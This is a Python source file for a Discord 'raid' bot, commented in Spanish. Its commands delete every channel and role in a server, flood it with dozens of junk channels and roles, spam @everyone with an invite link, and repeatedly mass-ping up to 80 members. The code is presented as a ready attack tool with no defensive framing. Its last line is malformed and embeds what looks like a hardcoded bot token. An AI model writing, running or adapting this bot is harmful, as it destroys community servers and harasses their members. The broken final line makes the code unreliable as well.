import discord
from discord.ext import commands
import asyncio
import random
import string

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

# ==================== CONFIG MC RAID ====================
SPAM_MSG = "@everyone **RAID BY MC RAID** 🔥 SERVER NUKED FOREVER https://discord.gg/bqfHNchGm6"
DELAY = 0.12
# =====================================================

@bot.event
async def on_ready():
    print(f"🚀 MC RAID BOT NUCLEAR ONLINE → {bot.user}")
    await bot.change_presence(activity=discord.Streaming(name="MC RAID MODE 🔥", url="https://discord.gg/bqfHNchGm6"))

@bot.command()
async def raid(ctx, canales: int = 80):
    await ctx.message.delete()
    guild = ctx.guild
    print(f"🔥 RAID TOTAL INICIADO EN: {guild.name} ({guild.id})")

    # SPAM MASIVO
    for channel in list(guild.text_channels):
        for _ in range(30):
            try:
                await channel.send(SPAM_MSG)
                await asyncio.sleep(DELAY)
            except:
                pass

    # CREAR CANALES MASIVOS
    for i in range(canales):
        try:
            name = ''.join(random.choices(string.ascii_lowercase + "mcraid", k=15))
            await guild.create_text_channel(f"raided-by-mc-raid-{name}")
        except:
            pass

    print("✅ RAID TERMINADO")

@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    print(f"☢️ NUKE TOTAL EN: {guild.name}")

    # BORRAR TODO
    for channel in list(guild.channels):
        try:
            await channel.delete()
        except:
            pass

    # BORRAR ROLES
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
            except:
                pass

    # CREAR ROLES CAOS
    for i in range(50):
        try:
            await guild.create_role(name=f"RAIDED-BY-MC-RAID-{i}", color=discord.Color.random())
        except:
            pass

    await raid(ctx, 120)

@bot.command()
async def spam(ctx, cantidad: int = 200):
    await ctx.message.delete()
    for _ in range(cantidad):
        try:
            await ctx.send(SPAM_MSG)
            await asyncio.sleep(0.08)
        except:
            break

@bot.command()
async def massping(ctx):
    await ctx.message.delete()
    members = [m.mention for m in ctx.guild.members if not m.bot][:80]
    ping = " ".join(members)
    for _ in range(25):
        try:
            await ctx.send(f"{ping}\n{SPAM_MSG}")
            await asyncio.sleep(0.4)
        except:
            pass

bot.run(os.getenv("bot.run("MTUwNDAwODEwMDk0NzAzNDE1Mg.GAiyf_.A26XkNDfXjxfKGgSh1rzvbpVGcWwEqghzezxTQ")"))
